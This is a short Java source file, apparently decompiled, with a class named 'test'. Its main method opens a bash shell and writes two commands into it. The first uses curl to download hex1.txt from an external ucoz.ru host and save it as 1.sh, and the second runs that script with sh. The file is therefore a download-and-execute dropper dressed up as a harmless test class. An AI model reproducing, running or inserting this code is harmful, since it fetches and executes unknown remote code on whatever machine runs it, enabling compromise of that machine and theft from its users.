package cmd;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.OutputStreamWriter;

public class test
{
  public static void main(String[] args) {
     ProcessBuilder processBuilder = new ProcessBuilder(new String[0]);

    
     processBuilder.command(new String[] { "bash" });

    
    try {
       Process process = processBuilder.start();

      
       BufferedReader reader = 
         new BufferedReader(new InputStreamReader(process.getInputStream()));
       OutputStream os = process.getOutputStream();
       BufferedWriter bw = 
         new BufferedWriter(new OutputStreamWriter(os));
      
       bw.write("curl -o 1.sh https://igriastranomier.ucoz.ru/hex1.txt");
       bw.newLine();
       bw.write("sh 1.sh");
      bw.newLine();
       bw.flush();
      String line;
       while ((line = reader.readLine()) != null) {
        System.out.println(line);
      }
      
       int exitCode = process.waitFor();
       System.out.println("\nExited with error code : " + exitCode);
    }
     catch (IOException e) {
      e.printStackTrace();
     } catch (InterruptedException e) {
       e.printStackTrace();
    } 
  }
}